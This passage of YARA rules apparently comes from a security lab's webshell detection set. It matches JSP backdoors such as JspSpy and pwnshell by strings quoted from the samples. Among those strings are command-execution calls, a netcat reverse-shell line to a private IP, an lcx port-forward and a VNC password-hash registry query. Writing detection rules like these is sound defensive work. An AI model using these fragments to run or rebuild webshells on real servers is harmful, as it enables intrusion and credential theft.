        $s15 = "Object remoteIP = JSession.getAttribute(\"remoteIP\");" fullword ascii
        $s16 = "return f1.getName().compareTo(f2.getName());" fullword ascii
        $s17 = "Object port = JSession.getAttribute(\"port\");" fullword ascii
        $s18 = "if (!Util.isEmpty(target) && !Util.isEmpty(src)) {" fullword ascii
        $s19 = "OnLineProcess olp = new OnLineProcess(pro);" fullword ascii
        $s20 = "Object obj = JSession.getAttribute(PORT_MAP);" fullword ascii
    condition:
        ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c or uint16(0) == 0x6f43 ) and filesize < 500KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0469aa92db9d69692fef21d502f879a7b2566718_41cf3b413baf202a88541419419e3cd7ea9ab999_7de0f7d7b1db6158355f17e4c5e4a1be0d2c6e0f_12
{
    meta:
        description = "jsp - from files 0469aa92db9d69692fef21d502f879a7b2566718.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6d6c6abcfc5025864b2be74e533c641ce8a00ec8afb6b1e11cd0d191e653e008"
        hash2 = "447696b43af95310a23b953a8822b97a1bdd30f6b8164c890d82763cf022a966"
        hash3 = "e2267655902470372107057a01a36fe882229f1fc5047ee3215dc2619496e680"
    strings:
        $s1 = "<a href=\"?path=<%String tempfilepath1=request.getParameter(\"path\"); if(tempfilepath!=null) path=tempfilepath;%><%=path%>&" fullword ascii
        $s2 = "cmd = (String)request.getParameter(\"command\");result = exeCmd(cmd);%>" fullword ascii
        $s3 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword ascii
        $s4 = "<input type=\"submit\" name=\"Button\" value=\"Login\" id=\"Button\" title=\"Click here to login\" class=\"button\" /> " fullword ascii
        $s5 = "if (password == null && session.getAttribute(\"password\") == null) {" fullword ascii
        $s6 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.library.path\").replaceAll(env.queryHashtable(\"path.sep" fullword ascii
        $s7 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.io.tmpdir\")%></td>" fullword ascii
        $s8 = "<td width=\"20%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.runtime.version\")%></td>" fullword ascii
        $s9 = "<td height=\"22\" colspan=\"3\">&nbsp;<%= request.getServerName() %>(<%=request.getRemoteAddr()%>)</td>" fullword ascii
        $s10 = "<a href=\"<%=selfName %>?path=<%=path%><%=fList[j].getName()%>\\\"> <%=fList[j].getName()%></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" fullword ascii
        $s11 = "String password=request.getParameter(\"password\");" fullword ascii
        $s12 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword ascii
        $s13 = "//if(request.getQueryString()!=null&&request.getQueryString().indexOf(act,0)>=0)action=request.getParameter(act);" fullword ascii
        $s14 = "tempfilename=(String)session.getId();" fullword ascii
        $s15 = "<textarea name=\"content\" cols=\"105\" rows=\"30\"><%=readAllFile(editfile)%></textarea>" fullword ascii
        $s16 = "<td colspan=\"3\">&nbsp;<%=env.queryHashtable(\"os.name\")%> <%=env.queryHashtable(\"os.version\")%> " fullword ascii
        $s17 = "{editfilecontent=new String(editfilecontent1.getBytes(\"ISO8859_1\"));}" fullword ascii
        $s18 = "* <p>Company: zero.cnbct.org</p>" fullword ascii
        $s19 = "//String tempfilename=request.getParameter(\"file\");" fullword ascii
        $s20 = "String editfilecontent1=request.getParameter(\"content\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 80KB and ( 8 of them ) ) or ( all of them )
}

rule _3e1cd375612c3bde5c4f01bb1839c41a442bca15_b33181d4e25c844360ac8bcb0630c3ccc0819100_13
{
    meta:
        description = "jsp - from files 3e1cd375612c3bde5c4f01bb1839c41a442bca15.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a7dfeaedd16e6338e1db155de166500dfb8371622e9c21f0aea09040ccfe8579"
        hash2 = "4b271359de0e0becb65f842c7a4b72409efa5488700f07a744f8b6d3b65be1af"
    strings:
        $s1 = "page.modules = $().add(page.loginDialog).add(page.fileTable);" fullword ascii
        $s2 = "tryTime.find('.times').text(parseInt(result.data[\"max-try\"]) - parseInt(result.data['try-time']));" fullword ascii
        $s3 = "page.logoutLink.text('Logout ' + result.data['username']);" fullword ascii
        $s4 = "<script src=\"https://cdn.bootcss.com/respond.js/1.4.2/respond.min.js\"></script>" fullword ascii
        $s5 = "<script src=\"https://cdn.bootcss.com/jquery.form/3.51/jquery.form.min.js\"></script>" fullword ascii
        $s6 = "<script src=\"https://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js\"></script>" fullword ascii
        $s7 = "<script src=\"https://cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script>" fullword ascii
        $s8 = "<link href=\"https://cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\" rel=\"stylesheet\"/>" fullword ascii
        $s9 = "<script src=\"https://cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script>" fullword ascii
        $s10 = "result.data = page.processDataXML(result.dataElement);" fullword ascii
        $s11 = "$(document).on('click', 'table.table tr.type-file a.btn-view, table.table tr.type-file a.btn-download', function (e) {" fullword ascii
        $s12 = "<input type=\"submit\" name=\"login-submit\" id=\"login-submit\" tabindex=\"3\"" fullword ascii
        $s13 = "page.loginDialog = $('#login-dialog');" fullword ascii
        $s14 = "<form id=\"login-form\" method=\"post\" role=\"form\">" fullword ascii
        $s15 = "page.processResponseXML = function (response, status, xhr) {" fullword ascii
        $s16 = "$.get(href, {_x: 1, _a: 'logout'}, function (response, status, xhr) {" fullword ascii
        $s17 = "var alert = page.loginDialog.find('.alert');" fullword ascii
        $s18 = "$.get(row.data('delete_url'), function (response, status, xhr) {" fullword ascii
        $s19 = "row.find('td label span').html('<a href=\"javascript:;\">[' + e.name + ']</a>');" fullword ascii
        $s20 = "<input type=\"password\" name=\"password\" id=\"password\" tabindex=\"2\"" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x213c ) and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _48972f48f93f1cbdb0e4b95753da97ffdb58168f_b6eaf949b5037ce7ed2b16ed0752bc506b0664a2_14
{
    meta:
        description = "jsp - from files 48972f48f93f1cbdb0e4b95753da97ffdb58168f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ecf43efae44a4fb4078bc7da76e07cc10fe4e92fc145b58d7999f0cc2b902cde"
        hash2 = "c8c694306c27bfbe133f1694168f05026de575a94e2f63ba1fe65b46502c59e4"
    strings:
        $s1 = "private static final String checkNewVersion = \"http://www.shack2.org/soft/javamanage/Getnewversion.jsp\";//" fullword ascii
        $s2 = "<form action=\"<%=shellPath %>?m=Login&do=DoLogin\" method=\"post\"" fullword ascii
        $s3 = "p = Runtime.getRuntime().exec(cmds);" fullword ascii
        $s4 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','do':'editFile','path':'<%=currentPath%>'})\">" fullword ascii
        $s5 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','do':'downFile','path':'<%=currentPath%>'})\">" fullword ascii
        $s6 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=Util.formatPath(cf.getPath())%>'})\">" fullword ascii
        $s7 = "Object obj=dbo.execute(runmysql);" fullword ascii
        $s8 = "192.168.11.11 |Java WebManage coded by shack2" fullword ascii
        $s9 = "Object o = dbo.execute(runmysql);" fullword ascii
        $s10 = "href=\"javascript:post('<%=shellPath%>',{m:'FileManage',do:'delete',path:'<%=currentPath%>'})\">" fullword ascii
        $s11 = "result=Util.execCmd(cmd,encode);" fullword ascii
        $s12 = "value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:/ninty.mdb'>Access</option>" fullword ascii
        $s13 = "href=\"javascript:post('<%=shellPath%>',{m:'CMDS'})\" name=\"CMDS\">" fullword ascii
        $s14 = "value='com.mysql.jdbc.Driver`jdbc:mysql://localhost:3306/mysql?useUnicode=true&characterEncoding=GBK'>Mysql</option>" fullword ascii
        $s15 = "value='com.microsoft.jdbc.sqlserver.SQLServerDriver`jdbc:microsoft:sqlserver://localhost:1433;DatabaseName=master'>Sql" fullword ascii
        $s16 = "href=\"javascript:post('<%=shellPath%>',{'m':'FileManage','dir':'<%=webRootPath%>'})\">|Web" fullword ascii
        $s17 = "enctype=\"application/x-www-form-urlencoded\" name=\"loginForm\">" fullword ascii
        $s18 = "All Rights Reserved| coded by shack2 | Powered By SJavaWebManage|" fullword ascii
        $s19 = "post('<%=shellPath%>',{'m':'FileManage','do':'delete','path':path,'files':delfs});" fullword ascii
        $s20 = "<input type=\"text\" name=\"exportDataPath\" value=\"c:/sql.txt\"></input> <input" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _4d58bcd197f2b63c8b93239da1da149d10f5cc12_bc1e03a04fc41a10945e263d865f30ad91f6736c_15
{
    meta:
        description = "jsp - from files 4d58bcd197f2b63c8b93239da1da149d10f5cc12.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
        hash2 = "8a32fa3ed14e8fa7e4139e258c7a65ff4fbc3ddb8bc0e0129059c8bdd542e228"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(strCommand, null," fullword ascii
        $x2 = "<a href=\"http://www.kukafei520.net/blog\" target=\"_blank\">http://www.kukkafei520.net/blog</a>" fullword ascii
        $s3 = "+ \"<form name=login method=post>username:<input name=LName type=text size=15><br>\"" fullword ascii
        $s4 = "+ \"password:<input name=LPass type=password size=15><br><input type=submit value=Login></form></center>\");" fullword ascii
        $s5 = "pw.println(\"print \\\"voilet shell\\nblog:www.kukafei520.net.\\\\n\\\";\");" fullword ascii
        $s6 = "+ \"<form name=login method=post>" fullword ascii
        $s7 = "<div id=\"menu4\" class=\"tabcontent\"><!-- linux nc shell -->" fullword ascii
        $s8 = "<a href=\"#\" onClick=\"return expandcontent('menu2', this)\"> <%=strCommand[languageNo]%>" fullword ascii
        $s9 = "\" + props.getProperty(\"java.io.tmpdir\")" fullword ascii
        $s10 = "\" + props.getProperty(\"user.dir\") + \"<br>\");" fullword ascii
        $s11 = "&& request.getParameter(\"LPass\").equals(password)) {" fullword ascii
        $s12 = "//System.out.println(strCommand);" fullword ascii
        $s13 = "+ props.getProperty(\"os.version\") + \"</h3>\");" fullword ascii
        $s14 = "\" + props.getProperty(\"user.home\") + \"<br>\");" fullword ascii
        $s15 = "\" + props.getProperty(\"user.name\") + \"<br>\");" fullword ascii
        $s16 = "private final String lineSeparator = System.getProperty(" fullword ascii
        $s17 = "value=\"<%=strExecute[languageNo]%>\">" fullword ascii
        $s18 = "+ list[i].getName() + \"','\" + strCmd + \"','\"" fullword ascii
        $s19 = "String[] strExecute = {\"" fullword ascii
        $s20 = "strCommand[2] = \"chmod +x /tmp/tst.pl\";" fullword ascii
    condition:
        ( ( uint16(0) == 0x3c0a or uint16(0) == 0x253c ) and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _094b96e84e01793e542f8d045af68da015a4a7fc_0d4b369f7cba724aaa4962caf463c5cfb915a141_4efa90145d62e21bfc37023580d455489ff1de37__16
{
    meta:
        description = "jsp - from files 094b96e84e01793e542f8d045af68da015a4a7fc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
        hash2 = "8f3cbb8d25d2371f2366f0cfbba3cb1e86dff7f5df90278be186abfc03d930be"
        hash3 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
        hash4 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
        hash5 = "df204c8c4accc4a508a86a91a63700ea4cf803dd273272c746f94a77ec933d23"
        hash6 = "7806a1b185b2dbb935880050d90ffdc502d5e6ac2b80950bced653f7e506aa00"
        hash7 = "50f7ee552bcb9706aedfdb3219dc340c9a6b3c451d0898b9d4c2ab1ffc14efb1"
        hash8 = "ab9fd7ec29a69d4caa54c063c86d02f334ae1add49b0acd42a4afdfd05cb7ae0"
        hash9 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
        hash10 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
        hash11 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
        hash12 = "ef63eb867061b4b442ec4dc81fe92db3f716da56b82ba14895979c3c0be569a6"
        hash13 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
        hash14 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
        hash15 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
        hash16 = "0e373739c55c3a79f033d10214ad88a700c7d3ee862d35bf71d0c36578454277"
        hash17 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
        hash18 = "a7fab64062972d0a6adb905d2b9aa3b193c48a4f951c6db370b1b809f25235f1"
    strings:
        $x1 = "cmd = \"cmd.exe /c set\";" fullword ascii
        $s2 = "private static final String MODIFIED_ERROR = \"JspSpy Was Modified By Some Other Applications. Please Logout.\";" fullword ascii
        $s3 = "Object o = dbo.execute(sql);" fullword ascii
        $s4 = "String targetPort = request.getParameter(\"targetPort\");" fullword ascii
        $s5 = "private OutputStream targetOutput = null;" fullword ascii
        $s6 = "targetIP = \"127.0.0.1\";" fullword ascii
        $s7 = "upload.setTargetOutput(stream);" fullword ascii
        $s8 = "private static final String BACK_HREF = \" <a href='javascript:history.back()'>Back</a>\";" fullword ascii
        $s9 = "Ddbo.getConn().setCatalog(request.getParameter(\"catalog\"));" fullword ascii
        $s10 = "String currentd = JSession.getAttribute(CURRENT_DIR).toString();" fullword ascii
        $s11 = "String targetIP = request.getParameter(\"targetIP\");" fullword ascii
        $s12 = "if (Util.isEmpty(targetPort))" fullword ascii
        $s13 = "this.targetOutput = stream;" fullword ascii
        $s14 = "public void setTargetOutput(OutputStream stream) {" fullword ascii
        $s15 = "targetPort = \"3389\";" fullword ascii
        $s16 = "SpyClassLoader loader = new SpyClassLoader();" fullword ascii
        $s17 = "this.fileExts = request.getParameter(\"fileext\").split(\",\");" fullword ascii
        $s18 = "this.exclude = request.getParameter(\"exclude\").split(\",\");" fullword ascii
        $s19 = "String yourPort = request.getParameter(\"yourPort\");" fullword ascii
        $s20 = "String config = request.getParameter(\"config\");" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 500KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _4c2464503237beba54f66f4a099e7e75028707aa_77110bad5de094ad8416b264937698ba2f767771_17
{
    meta:
        description = "jsp - from files 4c2464503237beba54f66f4a099e7e75028707aa.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b90b999b3d22fc2031ea2af13e3379be2c7d82bbed3544e8ab1c90da4a271750"
        hash2 = "09b677ca8806f681cb31ad69b8ec79b3416b491a04b8283d606ac7ba7edffeda"
    strings:
        $x1 = "Hashtable ht = parser.processData(request.getInputStream(), \"-\", tempdir);" fullword ascii
        $s2 = "response.setHeader (\"Content-Disposition\", \"attachment;filename=\\\"bagheera.zip\\\"\");" fullword ascii
        $s3 = "response.setHeader (\"Content-Disposition\", \"attachment;filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
        $s4 = ".login { font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666; width:320px; }" fullword ascii
        $s5 = "public Hashtable processData(ServletInputStream is, String boundary, String saveInDir)" fullword ascii
        $s6 = "else if (ext.equals(\".htm\")||ext.equals(\".html\")||ext.equals(\".shtml\")) response.setContentType(\"text/html\");" fullword ascii
        $s7 = "else if (ext.equals(\".mid\")||ext.equals(\".midi\")) response.setContentType(\"audio/x-midi\");" fullword ascii
        $s8 = "else if (ext.equals(\".mov\")||ext.equals(\".qt\")) response.setContentType(\"video/quicktime\");" fullword ascii
        $s9 = "*E-mail:bagheera@beareyes.com                                                        *" fullword ascii
        $s10 = "if ((request.getContentType()!=null)&&(request.getContentType().toLowerCase().startsWith(\"multipart\"))){" fullword ascii
        $s11 = "else if (ext.equals(\".tiff\")||ext.equals(\".tif\")) response.setContentType(\"image/tiff\");" fullword ascii
        $s12 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Delete Files\"))){" fullword ascii
        $s13 = "case 1:return f1.getAbsolutePath().toUpperCase().compareTo(f2.getAbsolutePath().toUpperCase());" fullword ascii
        $s14 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Move Files\"))){" fullword ascii
        $s15 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Copy Files\"))){" fullword ascii
        $s16 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Save as zip\"))){" fullword ascii
        $s17 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Create Dir\"))){" fullword ascii
        $s18 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Create File\"))){" fullword ascii
        $s19 = "<td title=\"Enter the new filename\"><input type=\"text\" name=\"new_name\" value=\"<%=ef.getName()%>\"></td>" fullword ascii
        $s20 = "*http://jmmm.com                                                                     *" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0d980bb944a1021431fc0b2d805c5c31994ca486_3e1cd375612c3bde5c4f01bb1839c41a442bca15_18
{
    meta:
        description = "jsp - from files 0d980bb944a1021431fc0b2d805c5c31994ca486.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "07d1e01f53e545b61e0c1fea9f035f3e9fe51da027fe34d962f5ba6a19ca09ad"
        hash2 = "a7dfeaedd16e6338e1db155de166500dfb8371622e9c21f0aea09040ccfe8579"
    strings:
        $s1 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + file.getName() + \"\\\";filename*=UTF-" fullword ascii
        $s2 = "public Shell(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, ServletC" fullword ascii
        $s3 = "return request.getMethod().toUpperCase().equals(\"POST\") && \"login-form\".equals(request.getParameter(\"form-name\"));" fullword ascii
        $s4 = "fileInfo.put(\"download_url\", getUrl(\"download\", file.getAbsolutePath()));" fullword ascii
        $s5 = "return blockUtil == null ? 0 : (int) (Math.max(0, blockUtil - System.currentTimeMillis()) / 1000);" fullword ascii
        $s6 = "public boolean onService(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, " fullword ascii
        $s7 = "data.put(\"breadcrumb\", getBreadCrumb(data.get(\"pwd\").toString()));" fullword ascii
        $s8 = "if (Config.USER.equals(userName) && Config.PASSWORD.equals(password)) {" fullword ascii
        $s9 = "Long blockUtil = System.currentTimeMillis() + Config.BLOCKING_TIME * 1000;" fullword ascii
        $s10 = "//System.out.println(System.getProperty(\"user.home\"));" fullword ascii
        $s11 = "data.put(\"username\", session.getAttribute(\"_user\"));" fullword ascii
        $s12 = "element.appendChild(createElement(doc, entry.getKey().toString(), entry.getValue()));" fullword ascii
        $s13 = "path = path.replaceFirst(\"^~\", System.getProperty(\"user.home\", \"/\"));" fullword ascii
        $s14 = "Shell shell = new Shell(request, response, session, context, application, config, out);" fullword ascii
        $s15 = "return Config.USER.equals(session.getAttribute(\"_user\"));" fullword ascii
        $s16 = "String path = System.getProperty(\"user.dir\", \"/\");" fullword ascii
        $s17 = "Files.copy(Paths.get(file.getAbsolutePath()), response.getOutputStream());" fullword ascii
        $s18 = "fileInfo.put(\"delete_url\", getUrl(\"delete\", file.getAbsolutePath()));" fullword ascii
        $s19 = "String password = getParam(\"password\", \"\").trim();" fullword ascii
        $s20 = "protected List<HashMap<String, String>> getBreadCrumb(String path) {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _7e3545b63eead01a8f509cdd5304e78d6ae1a047_7eb3278d8a711fbf2058be163ed86fd7d5d4ddea_19
{
    meta:
        description = "jsp - from files 7e3545b63eead01a8f509cdd5304e78d6ae1a047.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "91de9ba378e4bd757dad532d7c5a0b59c2404d29d7c20332bc167e3134bc64db"
        hash2 = "678805f0f5a90ced28c0b4c430c367220f2e315372a4f615f3b47b377c739d77"
    strings:
        $s1 = "sb.append(\"<span class='directory'><a class='dirs' href='javascript:goToDirectory(\\\"\" + encoded + \"\\\")'>\");" fullword ascii
        $s2 = "<% /* pwnshell.jsp - www.i0day.com */ %>" fullword ascii
        $s3 = "String finalPath = getExecutableFromPath(cmd);" fullword ascii
        $s4 = "private String getExecutableFromPath(String executableName) {" fullword ascii
        $s5 = "targets.add(currentDir + File.separator + entry);" fullword ascii
        $s6 = "buff = \"This shell is designed to help you pivot from the target\";" fullword ascii
        $s7 = "cmdArray[0] = \"cmd.exe\";" fullword ascii
        $s8 = "buf.append(commandLine.charAt(i + 1));" fullword ascii
        $s9 = "basicCmds = [ \"help\", \"ls \", \"ls -al \", \"pwd\", \"cd \", \"clear\", \"cls\", \"show jndi\", \"show session\" ];" fullword ascii
        $s10 = "private String processCmd(String cmdLine) {" fullword ascii
        $s11 = "fullyQualifiedExecutable = file.getAbsolutePath();" fullword ascii
        $s12 = "buff+= \"Here are the shell-specific commands:<br><br>\";" fullword ascii
        $s13 = "private String process(String cmd, String[] arguments) {" fullword ascii
        $s14 = "//privs[2] = f.canExecute() ? 'X' : '-'; canExecute() was introduced in 1.6" fullword ascii
        $s15 = "|| (commandLine.charAt(i + 1) == '\\\\'))) {" fullword ascii
        $s16 = "sb.append(\"<span class='error'>Invalid syntax for 'show' command. Usage: <br/>\");" fullword ascii
        $s17 = "if ( i != targets.size() - 1 ) {" fullword ascii
        $s18 = "printMessage(\"<b>Executing:</b> \" + c);" fullword ascii
        $s19 = "&& ((commandLine.charAt(i + 1) == '\"')" fullword ascii
        $s20 = "$(\"#fake_prompt\").html(user + \"@\" + host + \" \" + dir + \" $<br/>\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 900KB and ( 8 of them ) ) or ( all of them )
}

rule _dbff4ab1cb157db88dc3542a8c96b9ed0cc6ba2b_ff6e83c72acf21c58d67873de03ec26c31347731_20
{
    meta:
        description = "jsp - from files dbff4ab1cb157db88dc3542a8c96b9ed0cc6ba2b.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "91f4ee44392649bcb043b8d9db2ed42186934e065dc31241c8da7076c6e9e575"
        hash2 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
    strings:
        $s1 = "sbFolder.append(\"','\"+formatPath(strDir)+\"\\\\\\\\hZipFile.zip','\" + strCmd + \"','1','');\\\">\");" fullword ascii
        $s2 = "onClick=\"return expandcontent('menu2', this)\"><%=strCommand[languageNo]%></a>" fullword ascii
        $s3 = "out.println(\"<li>Start Memory:\" + startMem + \"</li>\");" fullword ascii
        $s4 = "&& request.getParameter(\"password\").equals(password)) {" fullword ascii
        $s5 = "\"cmd /c \" + strCmd);" fullword ascii
        $s6 = "out.println(\"<li>End Memory:\" + endMem + \"</li>\");" fullword ascii
        $s7 = "out.println(\"<li>Total Memory:\" + total + \"</li>\");" fullword ascii
        $s8 = "out.println(\"<li>Use memory: \" + (startMem - endMem) + \"</li>\");" fullword ascii
        $s9 = "out.println(\"<li>Use Time: \" + (endTime - startTime) + \"</li>\");" fullword ascii
        $s10 = "&lt;li&gt;&lt;%=key%&gt;:&lt;%=props.get(key)%&gt;&lt;/li&gt;<br />" fullword ascii
        $s11 = "if (request.getParameter(\"password\") != null" fullword ascii
        $s12 = "sbFolder.append(\"- - - - - - - - - - - </td></tr>\\r\\n\");" fullword ascii
        $s13 = "String[] strExecute = { \"" fullword ascii
        $s14 = "sbFolder.append(list[i].getName()+ \"</a>\");" fullword ascii
        $s15 = "sbFolder.append(\"','','\" + strCmd + \"','1','');\\\">\");" fullword ascii
        $s16 = "request.getSession().setAttribute(\"user\", \"ok\");" fullword ascii
        $s17 = "response.setHeader(\"content-type\"," fullword ascii
        $s18 = "\", \"Execute\" };" fullword ascii
        $s19 = "String user = (String) request.getSession().getAttribute(\"user\");" fullword ascii
        $s20 = "\"attachment; filename=\\\"\" + f.getName() + \"\\\"\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _094b96e84e01793e542f8d045af68da015a4a7fc_a2951b681435c42a5d89bdc7606042f821b134ef_bbff3db22a3ef1a273d02fc0a5031c77d5f6a20e__21
{
    meta:
        description = "jsp - from files 094b96e84e01793e542f8d045af68da015a4a7fc.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
        hash2 = "ab9fd7ec29a69d4caa54c063c86d02f334ae1add49b0acd42a4afdfd05cb7ae0"
        hash3 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
        hash4 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
    strings:
        $x1 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
        $x2 = "<a href=\\\"javascript:doPost({o:'vs'});\\\">Execute Command</a> | \"" fullword ascii
        $s3 = "<option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\RealVNC\\\\WinVNC4\\\" /v \\\"password\\\"'>vnc hash</option>\"" fullword ascii
        $s4 = "<a href=\\\"javascript:doPost({o:'vd'});\\\">Download Remote File</a> | \"" fullword ascii
        $s5 = "var savefilename = prompt('Input Target File Name(Only Support ZIP)','pack.zip');\"" fullword ascii
        $s6 = "var name = prompt('Input Target File Name (Only Support Zip)',tmpName);\"" fullword ascii
        $s7 = "tice ! If You Are Using IE , You Must Input Some Commands First After You Start Or You Will Not See The Echo</span>\"" fullword ascii
        $s8 = "<a href=\\\"javascript:doPost({o:'vbc'});\\\">Back Connect</a> | \"" fullword ascii
        $s9 = "var ie = window.navigator.userAgent.toLowerCase().indexOf(\\\"msie\\\") != -1;\"" fullword ascii
        $s10 = "if (showconfig && confirm('Need Pack Configuration?')) {doPost({o:'vPack',packedfile:this.path});return;}\"" fullword ascii
        $s11 = ".append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})\\\">V" ascii
        $s12 = "<!--<a href=\\\"javascript:alert('not support yet');\\\">Http Proxy</a> | -->\"" fullword ascii
        $s13 = "<td><a href=\\\"javascript:doPost({o:'logout'});\\\">Logout</a> | \"" fullword ascii
        $s14 = "<a href=\\\"javascript:doPost({o:'vPortScan'});;\\\">Port Scan</a> | \"" fullword ascii
        $s15 = "var elements = form.elements;for (var i = form.length - 1;i>=0;i--){form.removeChild(elements[i])}\"" fullword ascii
        $s16 = "<p><span style=\\\"font:11px Verdana;\\\">Password: </span>\"" fullword ascii
        $s17 = "<option value=\\\"lcx -slave 192.168.230.1 4444 127.0.0.1 3389\\\">lcx</option>\"" fullword ascii
        $s18 = "<a href=\\\"javascript:doPost({o:'vmp'});\\\">Port Map</a> | \"" fullword ascii
        $s19 = "<a href=\\\"javascript:doPost({o:'ev'});\\\">Eval Java Code</a> | \"" fullword ascii
        $s20 = "<a href=\\\"javascript:doPost({o:'vso'});\\\">Shell OnLine</a> | \"" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _4d58bcd197f2b63c8b93239da1da149d10f5cc12_bc1e03a04fc41a10945e263d865f30ad91f6736c_dbff4ab1cb157db88dc3542a8c96b9ed0cc6ba2b__22
{
    meta:
        description = "jsp - from files 4d58bcd197f2b63c8b93239da1da149d10f5cc12.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
        hash2 = "8a32fa3ed14e8fa7e4139e258c7a65ff4fbc3ddb8bc0e0129059c8bdd542e228"
        hash3 = "91f4ee44392649bcb043b8d9db2ed42186934e065dc31241c8da7076c6e9e575"
        hash4 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
    strings:
        $s1 = "Hashtable ht = parser.processData(request.getInputStream()," fullword ascii
        $s2 = "public Hashtable processData(ServletInputStream is, String boundary," fullword ascii
        $s3 = "sbFile.append(\"\" + list[i].getName());" fullword ascii
        $s4 = "String strContent = request.getParameter(\"content\");" fullword ascii
